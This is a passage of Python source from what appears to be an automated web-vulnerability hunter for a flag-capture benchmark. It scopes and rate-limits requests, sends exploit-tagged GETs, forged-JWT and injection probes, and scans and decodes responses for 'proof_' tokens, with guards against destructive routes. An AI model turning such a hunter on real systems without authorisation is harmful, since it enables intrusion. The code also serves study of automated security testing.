            if _web.safe_route_path(app_path, max_bytes=4096):
                self.app_root = app_path
                self.app_prefix = app_path if app_path.endswith("/") else app_path + "/"
                self.robots_route = self.app_prefix + "robots.txt"
                self.clues_route = self.app_prefix + "api/clues"
                self.openapi_route = self.app_prefix + "openapi.json"
        except Exception as e:      # OutOfScope, a bad URL
            self.host, self.client = "", None
            self.stopped = f"no client: {type(e).__name__}"

    # -- the guard ------------------------------------------------------------------------------------
    def _left(self):
        return None if self.deadline is None else float(self.deadline) - time.time()

    def _reserve_send(self):
        """Reserve one direct WebClient call, unless the target send gate closed."""
        with self._send_condition:
            if self._send_closed or self.stop.is_set():
                self.stopped = self.stopped or "stopped"
                return False
            self._active_sends += 1
            return True

    def _release_send(self):
        with self._send_condition:
            self._active_sends = max(0, self._active_sends - 1)
            if self._active_sends == 0:
                self._send_condition.notify_all()

    def _reserved_send_still_allowed(self):
        """Final gate after timeout setup and immediately before the wire call."""
        with self._send_condition:
            if self._send_closed or self.stop.is_set():
                self.stopped = self.stopped or "stopped"
                return False
            left = self._left()
            if left is not None and left <= DEADLINE_PAD:
                self.stopped = self.stopped or "deadline"
                return False
            return True

    def stop_now(self):
        """Close direct sends and wait out every reservation/in-flight call.

        WebClient has a bounded timeout capped to the absolute hunt deadline.
        Waiting here therefore preserves the deadline contract while making
        the stronger postcondition true: once this method returns, no direct
        GET/POST can begin later or still be on the wire.
        """
        with self._send_condition:
            self._send_closed = True
            while self._active_sends:
                self._send_condition.wait()

    def _may_send(self):
        if self._send_closed or self.stop.is_set():
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.request_ceiling is not None and self.requests >= self.request_ceiling:
            return False
        left = self._left()
        if left is not None and left <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def allowed(self, path, offered, trusted=False, allowed_actions=()):
        """Same-host absolute path, no destructive word in the path or a parameter name, and for a link
        the site offers (not our own payload) none in a parameter value either. `trusted` is set only for a
        route /api/clues itself disclosed under any top-level ``*_route`` key it advertises (B-236; the
        clue-driven GET classes):
        the app published it as the route to use and we only GET it, so a destructive WORD in the route NAME
        (`/execute-<hex>`) does not refuse it; the same-host scope lock and the parameter checks still hold,
        and no guessed path is ever trusted."""
        allowed_actions = frozenset(str(value).lower() for value in allowed_actions)
        # The exact state-transaction adapter is the only caller that may
        # waive one synthetic action verb.  Keep this a tiny closed set rather
        # than turning target-authored clues into a general mutation bypass.
        if allowed_actions and (not trusted or not allowed_actions <= {"upload", "redeem"}):
            return False
        if not isinstance(path, str) or not path.startswith("/") or path.startswith("//"):
            return False
        base, _, query = path.partition("?")
        # The query may intentionally carry a bounded LFI/SSRF/etc. payload
        # when ``offered`` is false, but the executable route itself is never
        # allowed to contain traversal, an authority or an embedded scheme.
        if not _web.safe_route_path(base, max_bytes=1024):
            return False
        base_layers = _web.canonical_route_layers(base, max_bytes=1024)
        if not base_layers:
            return False
        read_action = (getattr(self, "_router_read_actions", {}) or {}).get(path)
        for layer in base_layers:
            folded = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", layer)
            if read_action:
                # An exact discovery field can name a read-only control whose
                # noun contains one otherwise-stateful word (the observed
                # ``update_policy``). The waived verb must be directly paired
                # with a read-resource noun; a malicious ``update_account``
                # clue is still a state-changing route. Remove only that exact
                # token after this check; every other action remains forbidden.
                camel = re.sub(r"([a-z0-9])([A-Z])", r"\1/\2", layer)
                raw_tokens = [part.lower() for part in re.split(r"[^A-Za-z0-9]+", camel)
                              if part]
                read_nouns = {"catalog", "catalogs", "feed", "feeds", "info",
                              "manifest", "manifests", "metadata", "policies", "policy",
                              "release", "releases", "status"}
                for index, token in enumerate(raw_tokens):
                    if token != read_action:
                        continue
                    neighbors = raw_tokens[max(0, index - 1):index] + raw_tokens[index + 1:index + 2]
                    if not any(neighbor in read_nouns for neighbor in neighbors):
                        return False
                if _web.route_has_destructive_action(
                        layer, allowed_actions=(read_action,)):
                    return False
                tokens = [part for part in re.split(r"[^A-Za-z0-9]+", camel)
                          if part.lower() != read_action]
                if _TRUSTED_FATAL_PATH.search("/" + "/".join(tokens)):
                    return False
            elif (_web.route_has_destructive_action(layer, allowed_actions=allowed_actions)
                  or (_TRUSTED_FATAL_PATH.search(folded) if trusted else is_destructive(folded))):
                return False
        if offered and query and not _web.safe_route_query_component(query, max_bytes=1024):
            return False
        for k, v in urllib.parse.parse_qsl(query, keep_blank_values=True):
            if is_destructive(k) or (offered and is_destructive(v)):
                return False
            if offered:
                # A link/spec/source-map may contain a fetch/proxy parameter.
                # Merely inventorying that route is not authority to make the
                # target contact an inner URL; deliberate SSRF readers pass
                # offered=False and apply inner_ok() themselves.
                if (not _web.safe_route_query_component(k, max_bytes=1024)
                        or not _web.safe_route_query_component(v, max_bytes=1024)):
                    return False
        return True

    # -- one GET ---------------------------------------------------------------------------------------
    def fetch(self, path, shape="plain", payoff=False, group=None, offered=False, hops=0, headers=None, tag=None,
              trusted=False):
        """GET one same-host path. Returns the page dict (the redirect's end when it was followed) or
        None. Never raises. `headers` (a forged JWT's, round 4; a browser fetch's, the clue classes) go with the
        GET; such a page is kept under key(path, tag), apart from the plain page of the same path. `trusted` is
        passed only by the clue-driven readers for a route /api/clues disclosed (see allowed())."""
        try:
            return self._fetch(path, shape, payoff, group, offered, hops, headers, tag, trusted)
        except Exception:
            return None

    @staticmethod
    def key(path, tag=None):
        return path if not tag else f"{path}\x00{tag}"

    def _reserve_offline_analysis(self, kind, text):
        """Reserve bounded local analysis work; no wire or timer ownership."""
        left = self._left()
        if left is not None and left <= OFFLINE_ANALYSIS_MIN_SECONDS:
            return False
        size = min(1_000_000, len(str(text).encode("utf-8", "replace")))
        with self.lock:
            state = self.offline_analysis.get(kind)
            if (not isinstance(state, dict)
                    or state["items"] >= OFFLINE_ANALYSIS_MAX_ITEMS
                    or state["bytes"] + size > OFFLINE_ANALYSIS_MAX_BYTES):
                return False
            state["items"] += 1
            state["bytes"] += size
        return True

    def _offline_browser_findings(self, path, ctype, header_pairs, views):
        """Analyze independent already-fetched HTML/JS views; never send or answer."""
        if _browser_recon is None:
            return [], []
        route_path = str(path).split("?", 1)[0].lower()
        rows, leads = [], []
        for view in list(views or [])[:8]:
            text = str(view)[:1_000_000]
            prefix = text.lstrip().lower()
            is_html = ("html" in str(ctype).lower()
                       or route_path.endswith((".html", ".htm"))
                       or prefix.startswith(("<!doctype html", "<html")))
            is_js = ("javascript" in str(ctype).lower() or "ecmascript" in str(ctype).lower()
                     or route_path.endswith((".js", ".mjs", ".cjs")))
            if not is_html and not is_js:
                continue
            if not self._reserve_offline_analysis("browser", text):
                break
            try:
                analysis = _browser_recon.analyze(
                    html=text if is_html else "", js=text if is_js and not is_html else "",
                    headers=header_pairs if is_html else (),
                    base_url=urllib.parse.urljoin(self.url, str(path)),
                    deadline=self.deadline, stop=self.stop)
            except Exception:
                continue
            if analysis.get("stopped_early"):
                self.stopped = self.stopped or "offline analysis deadline"
                break
            findings = (analysis.get("findings") if is_html
                        else (analysis.get("javascript") or {}).get("findings")) or []
            for finding in findings[:24]:
                if not isinstance(finding, dict):
                    continue
                row = {"class": "browser_recon", "path": str(path).split("?", 1)[0]}
                row.update(dict(finding))
                if row not in rows:
                    rows.append(row)
            for lead in ((analysis.get("javascript") or {}).get("external_script_leads") or [])[:16]:
                if isinstance(lead, dict) and lead not in leads:
                    leads.append(dict(lead))
        return rows[:32], leads[:32]

    def _offline_session_findings(self, path, header_pairs, views):
        """Inventory cookie/session/CSRF metadata from independent fetched views.

        The analyzer deliberately omits cookie and CSRF values, performs no
        verification, and makes no request.  Keep carrier siblings separate so
        an HTML fragment in one archive member cannot bind a token found only
        in another.  Header-only cookie evidence is emitted once.
        """
        if _session_recon is None:
            return [], []
        reports, rows = [], []
        candidates = list(views or [""])[:8]
        if not candidates:
            candidates = [""]
        header_interest = any(
            str(name).lower() == "set-cookie" or "csrf" in str(name).lower() or "xsrf" in str(name).lower()
            for name, _value in list(header_pairs or [])[:512]
        )
        for index, view in enumerate(candidates):
            text = str(view)[:1_000_000]
            if not header_interest and "csrf" not in text.lower() and "xsrf" not in text.lower():
                continue
            if not self._reserve_offline_analysis("session", text):
                break
            try:
                report = _session_recon.analyze(
                    header_pairs, body=text,
                    source_url=urllib.parse.urljoin(self.url, str(path)),
                    deadline=self.deadline, stop=self.stop)
            except Exception:
                continue
            if not isinstance(report, dict):
                continue
            if report.get("stopped_early"):
                self.stopped = self.stopped or "offline analysis deadline"
                break
            summary = dict(report.get("summary") or {})
            csrf = dict(report.get("csrf") or {})
            rejected = list(report.get("rejected_cookies") or [])
            header_rejected = list((report.get("headers") or {}).get("rejected") or [])
            header_meaningful = (index == 0 and
                                 (any(summary.values()) or rejected or header_rejected
                                  or report.get("duplicate_names") or report.get("duplicate_values")))
            view_meaningful = bool(csrf.get("bindings") or csrf.get("tokens"))
            meaningful = header_meaningful or view_meaningful
            if not meaningful:
                continue
            reports.append(report)
            cookies = list(report.get("cookies") or [])
            row = {
                "class": "session_recon",
                "path": str(path).split("?", 1)[0],
                "carrier": index,
                "summary": summary,
                "cookie_names": [str(item.get("name"))[:128] for item in cookies[:32]
                                 if isinstance(item, dict) and item.get("name")],
                "prefix_violations": sorted({str(issue)[:128] for item in cookies[:32]
                                             if isinstance(item, dict)
                                             for issue in (item.get("prefix_violations") or [])}),
                "attribute_issues": sorted({str(issue)[:128] for item in cookies[:32]
                                            if isinstance(item, dict)
                                            for issue in (item.get("attribute_issues") or [])}),
                "envelope_kinds": sorted({str(env.get("kind"))[:128] for item in cookies[:32]
                                          if isinstance(item, dict)
                                          for env in (item.get("envelopes") or [])
                                          if isinstance(env, dict) and env.get("kind")}),
                "duplicate_names": [str(item.get("name"))[:128]
                                    for item in list(report.get("duplicate_names") or [])[:16]
                                    if isinstance(item, dict) and item.get("name")],
                "csrf_bindings": len(list(csrf.get("bindings") or [])),
                "rejected_cookie_fields": len(rejected),
                "rejected_header_fields": len(header_rejected),
                "offline_only": True,
                "credentials_replayed": False,
            }
            if row not in rows:
                rows.append(row)
        return reports[:8], rows[:16]

    def _fetch(self, path, shape, payoff, group, offered, hops, headers=None, tag=None, trusted=False):
        if self.client is None:
            return None
        if not self.allowed(path, offered, trusted):
            self.refused.append(path[:200])
            return None
        key = self.key(path, tag)
        with self.lock:
            if key in self.pages:
                return self.pages[key]
            if not self._may_send():
                return None
            if not self._reserve_send():
                return None
            self.requests += 1
            self.pages[key] = None
        try:
            left = self._left()
            # The timeout is per client; concurrent requests of one target all
            # cap to about the same time left.  Recheck the send gate after
            # this assignment: a test/client property may block here, and that
            # was the exact reservation-to-wire race caught by the regression.
            self.client.timeout = REQUEST_TIMEOUT if left is None else max(0.2, min(REQUEST_TIMEOUT, left - 0.1))
            if not self._reserved_send_still_allowed():
                return None
            try:
                r = self.client.request("GET", path, headers=dict(headers) if headers else None,
                                        allow_redirects=False)
            except Exception:
                return None
        finally:
            self._release_send()
        body = r.get("body")
        hdrs = r.get("response_headers") or {}
        raw_pairs = r.get("response_header_pairs")
        if isinstance(raw_pairs, (list, tuple)):
            hdr_pairs = [(str(item[0])[:1024], str(item[1])[:16_384])
                         for item in raw_pairs[:512]
                         if isinstance(item, (list, tuple)) and len(item) == 2]
        else:
            hdr_pairs = ([(str(key)[:1024], str(value)[:16_384])
                          for key, value in list(hdrs.items())[:512]]
                         if isinstance(hdrs, dict) else [])
        framing_error = None
        try:
            _web._validate_stream_framing(r.get("status"), hdr_pairs)
        except Exception as exc:
            framing_error = str(exc)[:240]
        if _forge_event is not None and hasattr(_forge_event, "response_text_views"):
            try:
                carrier_views = ([] if framing_error else
                                 list(_forge_event.response_text_views(r, strict=bool(payoff)))[:256])
            except Exception:
                carrier_views = []
        else:
            carrier_views = ([] if framing_error else
                             _legacy_response_views(r, body, hdr_pairs))
        # Keep every sibling carrier independent for payoff/proof decisions.  The
        # first coherent view remains the page parser's compatibility view; an
        # encoded/container declaration that fails decoding therefore supplies
        # no replacement-decoded text to links, JSON discovery, or proof scans.
        carrier_views = list(dict.fromkeys(str(value)[:1_000_000] for value in carrier_views))
        text = carrier_views[0] if carrier_views else ""
        status = r.get("status")
        explicit_rejection = False
        if payoff and _forge_event is not None:
            for view in carrier_views or [""]:
                try:
                    local_response = dict(r)
                    local_response["body"] = view.encode("utf-8", "strict")
                    local_response.pop("text", None)
                    if _forge_event.rejection_signal(local_response, structured_only=True):
                        explicit_rejection = True
                        break
                except Exception:
                    continue
        # A tagged exploit request is only a payoff when the transport itself
        # succeeded and the body is not an obvious framework soft-404/rejection.
        # A 3xx is followed (same origin, through the same guard), and 4xx/5xx
        # proof-looking error/debug bodies remain non-payoff data. The matcher
        # deliberately omits file/include warnings because an LFI warning may
        # precede bytes it did manage to return. POST peers apply stricter
        # semantic anchors.
        response_incomplete = _baseline_response_incomplete(r, framing_error=framing_error)
        transport_success = (not response_incomplete and isinstance(status, int) and 200 <= status < 300)
        soft_rejection = any(SOFT_PAYOFF_REJECTION.search(view) for view in carrier_views)
        effective_payoff = bool(payoff and transport_success and not explicit_rejection and not soft_rejection)
        scan_views = list(carrier_views)
        header_values = [value for _name, value in hdr_pairs]
        # An ambiguous response is unusable as application content.  Its raw
        # bytes/headers are nevertheless conservative baseline evidence: that
        # can only suppress a later duplicate decoy, never promote an answer.
        baseline_only_views = []
        conservative = ""
        if framing_error:
            baseline_only_views = [bytes(body).decode("utf-8", "replace")
                                   if isinstance(body, (bytes, bytearray)) else str(body or "")]
        if not effective_payoff and _forge_event is not None \
                and hasattr(_forge_event, "response_baseline_text"):
            try:
                conservative = _forge_event.response_baseline_text(r)
            except Exception:
                conservative = ""
            if conservative and conservative not in baseline_only_views:
                baseline_only_views.append(conservative)
        # Joined evidence is used only as a conservative control/discovery view.
        # A proof-bearing payoff is decided independently per body leaf/header.
        evidence_text = "\n".join(scan_views + baseline_only_views + header_values)
        ctype = str(next((value for name, value in hdr_pairs
                          if name.lower() == "content-type"), "")).lower()
        # Peers must receive the exact transport entity, not this Hunter's
        # decoded compatibility ``text`` paired with the original gzip/MIME
        # headers (which would make them decode an already-decoded body a
        # second time and lose authority/ambiguity information).
        peer_response = dict(r)
        if isinstance(r.get("response_headers"), dict):
            peer_response["response_headers"] = dict(r["response_headers"])
        if isinstance(r.get("headers"), dict):
            peer_response["headers"] = dict(r["headers"])
        if isinstance(r.get("response_header_pairs"), (list, tuple)):
            peer_response["response_header_pairs"] = list(r["response_header_pairs"])
        page = {"path": path, "status": status, "text": text, "shape": shape, "tag": tag,
                "payoff": effective_payoff, "evidence_text": evidence_text[:1_000_000],
                "baseline_text": conservative if not effective_payoff else "",
                "headers": {str(k): str(v) for k, v in hdrs.items()},
                "response_header_pairs": hdr_pairs,
                "carrier_view_count": len(scan_views), "ctype": ctype,
                "_peer_response": peer_response}
        if framing_error:
            page["framing_error"] = framing_error
        if response_incomplete:
            page["baseline_incomplete"] = True
        scanner = scan_for_proofs if effective_payoff else scan_for_baseline_proofs
        found = set()
        for view in scan_views + baseline_only_views + header_values:
            found.update(scanner(view, self.host))

        # Browser analysis is byte-local reconnaissance only.  It neither sends
        # a request nor promotes any sink/CSP observation to a proof.  Analyze
        # each coherent carrier separately so two MIME/archive siblings cannot
        # manufacture a source-to-sink flow by concatenation.
        browser_rows, browser_leads = self._offline_browser_findings(path, ctype, hdr_pairs, scan_views)
        if browser_rows:
            page["browser_findings"] = browser_rows
        if browser_leads:
            page["browser_script_leads"] = browser_leads
        session_reports, session_rows = self._offline_session_findings(path, hdr_pairs, scan_views)
        if session_reports:
            page["session_recon"] = session_reports
        with self.lock:
            self.pages[key] = page
            if response_incomplete:
                self.baseline_incomplete = True
            for row in browser_rows:
                if len(self.recon_findings) >= 160:
                    break
                if row not in self.recon_findings:
                    self.recon_findings.append(row)
            for row in session_rows:
                if len(self.recon_findings) >= 160:
                    break
                if row not in self.recon_findings:
                    self.recon_findings.append(row)
            for p in found:
                self.seen.setdefault(p, []).append((path.split("?", 1)[0], shape))
                if effective_payoff:
                    self.payoff.setdefault(p, (path, shape, group))
                    if self.hit_group is None:
                        self.hit_group = group
                else:
                    self.plain.add(p)
        # Exact-text does not promise that a future proof keeps today's wire
        # shape.  A target-authored success response may therefore contain a
        # useful new-format candidate.  Reuse forge_event's conservative
        # success/baseline parser, but never feed such a candidate to answer().
        if effective_payoff and _forge_event is not None:
            try:
                with self.lock:
                    baselines = [text for pg in self.pages.values()
                                 if isinstance(pg, dict) and not pg.get("payoff")
                                 for text in _page_baseline_texts(pg)]
                    baselines += list(self.plain)
                info = _forge_event.extract_success(r, baselines, host=self.host)
                # ``extract_success`` also reports proof-like bytes from an
                # unanchored response so callers can account for sibling
                # ambiguity.  This Hunter already classified the tagged GET
                # as a payoff and records today's strict proof directly above;
                # only treat the policy's *anchored* candidate channel as a
                # competing future representation.  Otherwise every ordinary
                # HTML/LFI payoff containing a proof but no generic "success"
                # word is duplicated into ``self.candidates`` and suppresses
                # its own valid answer.
                surfaced = list(info.get("candidates") or []) if info.get("success") else []
                if info.get("success") and info.get("auto") is None:
                    surfaced += list(info.get("wire") or [])
                with self.lock:
                    for value in surfaced[:12]:
                        entry = {"value": str(value)[:256], "path": path.split("?", 1)[0], "shape": shape}
                        if entry not in self.candidates:
                            self.candidates.append(entry)
                    if surfaced and info.get("success") and self.hit_group is None:
                        self.hit_group = group
            except Exception:
                pass
        if (framing_error is None and isinstance(status, int)
                and 300 <= status < 400 and hops < MAX_HOPS):
            locations = list(dict.fromkeys(value for name, value in hdr_pairs
                                           if name.lower() == "location"))
            # Conflicting duplicate Location fields are ambiguous.  Record the
            # redirect response but do not choose one interpretation to follow.
            loc = locations[0] if len(locations) == 1 else None
            nxt = self._same_host(loc, path)
            if nxt is None:
                return page
            page["next"] = nxt
            got = self.fetch(nxt, shape, payoff, group, True, hops + 1, headers, tag, trusted)
            return got or page
        return page

    def _same_host(self, raw, at):
        """A same-scheme, same-host, same-port path for a link or Location, else None."""
        if not raw or not isinstance(raw, str):
            return None
        try:
            return _web.safe_same_origin_route(
                raw, self.url, at=at, allow_query=True, guard_query=True, max_bytes=1024)
        except Exception:
            return None

    # -- a wave of parallel GETs ------------------------------------------------------------------------
    def wave(self, items):
        """items: ``(path, shape, payoff, group, offered[, headers, tag, trusted])``.

        ``trusted`` is reserved for an exact route from this target's clue document.  It waives only the
        synthetic action-word part of the GET path guard; scope, canonicalization, fatal verbs and query guards
        still apply.  Once a payoff proof shows, queued items of other groups are dropped while the hit's own
        group runs to its end.
        """
        items = [it for it in items if self.key(it[0], it[6] if len(it) > 6 else None) not in self.pages]
        if not items or not self._may_send():
            return
        idx = [0]
        lock = threading.Lock()

        def take():
            with lock:
                while idx[0] < len(items):
                    it = items[idx[0]]
                    idx[0] += 1
                    hg = self.hit_group
                    if hg is not None and it[3] != hg:
                        continue
                    return it
                return None

        def worker():
            while self._may_send():
                it = take()
                if it is None:
                    return
                headers = it[5] if len(it) > 5 else None
                tag = it[6] if len(it) > 6 else None
                trusted = bool(it[7]) if len(it) > 7 else False
                self.fetch(it[0], it[1], it[2], it[3], it[4], 0,
                           headers=headers, tag=tag, trusted=trusted)

        pool = cf.ThreadPoolExecutor(max_workers=min(WORKERS, len(items)))
        futs = [pool.submit(worker) for _ in range(min(WORKERS, len(items)))]
        left = self._left()
        cf.wait(futs, timeout=None if left is None else max(0.05, left))
        pool.shutdown(wait=False, cancel_futures=True)

    # -- reading the site ---------------------------------------------------------------------------------
    def _page(self, path):
        pg = self.pages.get(path)
        return pg if isinstance(pg, dict) else None

    def links(self, page):
        """Same-host links a page offers (attributes and quoted absolute paths), in page order."""
        out = []
        if not page or not page.get("text"):
            return out
        # a form's own tag is left out: its action is no link (a POST form is never sent, nor fetched with
        # GET; a GET form is only sent with its fields, by the SQLi reader)
        t = re.sub(r"(?is)<form\b[^>]*>", "<form>", page["text"][:400_000])
        raws = [next(g for g in m.groups() if g is not None) for m in _ATTR_URL.finditer(t)]
        raws += [m.group(1) for m in _QUOTED_PATH.finditer(t)]
        for raw in raws:
            p = self._same_host(raw, page["path"])
            if p and p not in out:
                out.append(p)
        return out

    def text_paths(self, page):
        if not page or not page.get("text"):
            return []
        return list(dict.fromkeys(m.group(1).rstrip(".") for m in _TEXT_PATH.finditer(page["text"][:400_000])))

    def forms(self, page):
        out = []
        if not page or not page.get("text"):
            return out
        for fm in _FORM.finditer(page["text"][:400_000]):
            a = _attrs(fm.group(1))
            method = (a.get("method") or "GET").upper()
            action = self._same_host(a.get("action") or page["path"].split("?", 1)[0], page["path"])
            if not action:
                continue
            fields = []
            for f in _FIELD.finditer(fm.group(2)):
                fa = _attrs(f.group(2))
                if fa.get("name") and (fa.get("type") or "text").lower() not in ("submit", "button", "file",
                                                                                   "image", "reset", "checkbox",
                                                                                   "radio", "password"):
                    fields.append((fa["name"], fa.get("value") or ""))
            # Keep the normalized full action as metadata for the stateful
            # CSRF reader.  Ordinary GET readers retain the historical
            # query-free `action`; the CSRF transition refuses, rather than
            # silently dropping, any target-authored query.
            out.append({"method": method, "action": action.split("?", 1)[0],
                        "stateful_action": action, "fields": fields})
        return out

    @staticmethod
    def json_of(page):
        if not page or not page.get("text"):
            return None
        t = page["text"].strip()
        if not t[:1] in ("{", "["):
            return None
        try:
            return _security_json.loads(t, max_chars=400_000)
        except Exception:
            return None

    @staticmethod
    def walk_json(obj, depth=0):
        """(key, value) for every scalar in a JSON document, nested."""
        if depth > 6:
            return
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, (dict, list)):
                    yield from _Hunter.walk_json(v, depth + 1)
                else:
                    yield str(k), v
        elif isinstance(obj, list):
            for v in obj[:500]:
                if isinstance(v, (dict, list)):
                    yield from _Hunter.walk_json(v, depth + 1)
                else:
                    yield "", v

    # -- the hunt -----------------------------------------------------------------------------------------
    def done(self):
        return self.answer() is not None

    def answer(self):
        """The single novel payoff proof (see the module text), or None."""
        if getattr(self, "baseline_incomplete", False):
            return None
        # A successful payoff also surfaced a plausible future-format token.
        # Today's strict wire value is then not uniquely safe to auto-submit;
        # retain both for the agent and fail closed.
        if getattr(self, "candidates", None):
            return None
        pay = self._novel_payoffs()
        if len(pay) != 1:
            return None
        p = next(iter(pay))
        return p if is_proof(p) else None

    def _novel_payoffs(self):
        """Proof-like payoff values absent from all baseline/plain responses."""
        with self.lock:
            # PROOF_SEEN is case-insensitive. Treat a case-only spelling change
            # as the same baseline value so an uppercase decoy cannot make its
            # lowercase echo look like a novel auto-submit candidate.
            plain = {p.casefold() for p in self.plain}
            return {p for p in self.payoff if p.casefold() not in plain}

    def _payoff_terminal(self):
        """A novel value exists: answerable now, ambiguous, or deliberately non-wire."""
        return bool(self._novel_payoffs() or self.candidates)

    # -- A3: recover a proof that came back LAYER-ENCODED, from bytes already fetched (no request) ---------
    def _decode_tokens(self):
        """Candidate encoded tokens from bytes the waves ALREADY pulled: each page body (and its
        HTML-entity-decoded form), its <pre>/<code> blocks, data: URIs, response headers and Set-Cookie
        values, and JSON string values. Sends nothing; widens the proof LOCATION past the body alone.

        Returns {token: {"payoff": bool, "plain": bool}}: whether the token appeared on a PAYOFF page
        (an exploit/payoff answer, `page["payoff"]`), on a PLAIN/recon page, or both. _recover_decoded
        uses that to gate a decoded proof exactly as answer() gates a plaintext one (new-code audit H2:
        a decoded proof from a landing/recon/plain page is a decoy and must not be banked).

        Responses to the wave-9 breadth/injection DETECTORS (shape in BREADTH_CLASSES: the NoSQL `$ne`
        oracle probe, GraphQL introspection, XXE/proto/deser/jwtconf) are left out entirely (new-code
        audit H11): the detectors are detect-only and must never bank a proof, so a `proof_` value that
        exists ONLY because a detector injected an operator is a crafted signal, never the hunt's plain
        answer. They are fetched payoff=False, so the H2 gate already drops them, but excluding them here
        makes the detectors' never-bank guarantee hold whatever their payoff flag."""
        with self.lock:
            pages = [p for p in self.pages.values()
                     if isinstance(p, dict) and p.get("shape") not in BREADTH_CLASSES]
        tokens = {}                                     # token -> {"payoff": bool, "plain": bool}

        def add(s, payoff):
            if not isinstance(s, str):
                return
            s = s.strip()
            if not (DECODE_MIN_TOKEN <= len(s) <= DECODE_MAX_TOKEN):
                return
            ent = tokens.get(s)
            if ent is None:
                if len(tokens) >= DECODE_MAX_TOKENS:
                    return
                ent = tokens[s] = {"payoff": False, "plain": False}
            if payoff:
                ent["payoff"] = True
            else:
                ent["plain"] = True

        def mine(text, payoff):
            """Pull the base64/base32/hex runs and data: URI payloads out of a text."""
            if not text:
                return
            t = text[:DECODE_BODY_CAP]
            for rx in (_B64_RUN, _B32_RUN, _HEX_RUN):
                for m in rx.finditer(t):
                    add(m.group(0), payoff)
            for m in _DATA_URI.finditer(t):
                add(m.group(1), payoff)

        for page in pages:
            if len(tokens) >= DECODE_MAX_TOKENS:
                break
            payoff = bool(page.get("payoff"))
            raw_body = page.get("text") or ""
            body = _strip_offhost_urls(raw_body, self.host)
            mine(body, payoff)
            try:
                un = _strip_offhost_urls(_html.unescape(raw_body[:DECODE_BODY_CAP]), self.host)
            except Exception:
                un = ""
            if un and un != body[:DECODE_BODY_CAP]:
                mine(un, payoff)
            for src in (body[:DECODE_BODY_CAP], un):
                for m in _PRE_CODE.finditer(src):
                    inner = m.group(1).strip()
                    add(inner, payoff)
                    try:
                        add(_html.unescape(inner), payoff)
                    except Exception:
                        pass
            for k, v in (page.get("headers") or {}).items():
                safe_value = _strip_offhost_urls(v, self.host)
                add(safe_value, payoff)
                mine(safe_value, payoff)
                if str(k).lower() == "set-cookie":
                    for cv in _cookie_values(v):
                        safe_cookie = _strip_offhost_urls(cv, self.host)
                        add(safe_cookie, payoff)
                        mine(safe_cookie, payoff)
            js = self.json_of(page)
            if js is not None:
                for _k, val in self.walk_json(js):
                    if isinstance(val, str):
                        safe_value = _strip_offhost_urls(val, self.host)
                        add(safe_value, payoff)
                        mine(safe_value, payoff)
        return tokens

    def _decoded_novel_payoffs(self):
        """Return ``(strict, proof_like)`` decoded novel-payoff values.

        This is deliberately a *set-producing* primitive rather than a
        first-match helper.  ``_finish`` must compare these values with proofs
        already promoted by the general response-carrier decoder; otherwise
        one representation can hide a different value in another
        representation and incorrectly satisfy the one-proof rule.

        Makes no request and fails closed as ``(set(), set())``.
        """
        # A surfaced future-format payoff is a second plausible answer. The
        # strict decoded token remains useful evidence, but is not uniquely safe
        # enough to auto-submit beside it.
        if getattr(self, "baseline_incomplete", False) or getattr(self, "candidates", None):
            return set(), set()
        try:
            tokens = self._decode_tokens()
        except Exception:
            return set(), set()
        strict, like, like_payoff, like_plain = set(), set(), set(), set()
        for tok, origin in tokens.items():
            try:
                for leaf in _decode_tree(tok):
                    text = bytes(leaf).decode("utf-8", "replace")
                    if "proof_" not in text.lower():
                        continue
                    for m in scan_for_proofs(text, self.host):
                        ml = m.lower()
                        like.add(ml)
                        if origin.get("payoff"):
                            like_payoff.add(ml)
                        if origin.get("plain"):
                            like_plain.add(ml)
                        if is_proof(m):
                            strict.add(m)
            except Exception:
                continue
        pay = like_payoff - like_plain     # a payoff proof no plain page also showed (mirrors answer())
        strict_pay = [proof for proof in strict if proof.lower() in pay]
        return set(strict_pay), set(pay)

    def _recover_decoded(self):
        """Recover the sole layer-encoded proof from bytes already fetched.

        Gated exactly like :meth:`answer`: the decoded proof must come from a
        PAYOFF page and be the sole payoff value left after subtracting every
        value decoded from plain/baseline pages.  A distinct baseline-only
        decoy does not hide a novel exploit result; the same value on both
        sides is refused.  Cross-representation uniqueness is enforced by
        ``_finish``; this helper retains the narrow decoded-only contract used
        by the offline tests and peer paths.
        """
        strict_pay, pay = self._decoded_novel_payoffs()
        if len(pay) == 1 and len(strict_pay) == 1:
            return next(iter(strict_pay))
        return None

    def _run_forge(self):
        """Hand recon to the bounded POST forge, sharing scope, cookies, deadline and budget.

        Returns ``(handled, proof)``.  ``handled`` is true only when the target
        declared the state-changing exploit successful; in that case the hunt
        stops even if a future-format candidate could only be surfaced.  A
        non-applicable or unsuccessful sweep leaves the GET waves free to run.
        """
        if _forge_event is None or self.client is None or not isinstance(self.forge_target, dict):
            return False, None
        ceiling = self.request_ceiling if self.request_ceiling is not None else self.max_requests
        remaining = max(0, min(self.max_requests, ceiling) - self.requests)
        if remaining <= 0 or self.stop.is_set():
            return False, None
        aid = str(self.forge_target.get("answer_id") or "target")
        meta, evidence = {}, []
        with self.lock:
            preloaded = {
                path: (dict(pg["_peer_response"])
                       if isinstance(pg.get("_peer_response"), dict) else pg)
                for path, pg in self.pages.items()
                if isinstance(path, str) and "\x00" not in path and isinstance(pg, dict)
            }
            baselines = [text for pg in self.pages.values()
                         if isinstance(pg, dict) and not pg.get("payoff")
                         for text in _page_baseline_texts(pg)]
            baselines += list(self.plain)
        captured = []
        guarded = _PeerClient(self, self.client, captured)
        started_requests = self.requests
        fctx = dict(self.forge_ctx or {})
        fctx.update({"deadline": self.deadline, "max_requests": remaining, "client": guarded,
                     "preloaded": preloaded, "baseline_texts": baselines, "stop": self.stop,
                     "evidence": evidence, "result_sink": meta, "prompt": self.post_prompt})
        try:
            proof = _forge_event.solve(dict(self.forge_target), fctx)
        except Exception as exc:
            actual = max(0, self.requests - started_requests)
            self._adopt_peer_baselines(captured, "forge")
            summary = {"requests": actual, "success": False, "terminal": bool(actual),
                       "candidates": [], "stopped": "exception",
                       "error": type(exc).__name__}
            with self.lock:
                self.forge_meta = summary
            if actual:
                self.where = "forge"
                self.stopped = self.stopped or "forge raised after a wire attempt"
                return True, None
            return False, None
        summary = meta.get(aid) or meta.get("target") or {}
        try:
            reported = max(0, min(remaining, int(summary.get("requests") or 0)))
        except (TypeError, ValueError):
            reported = 0
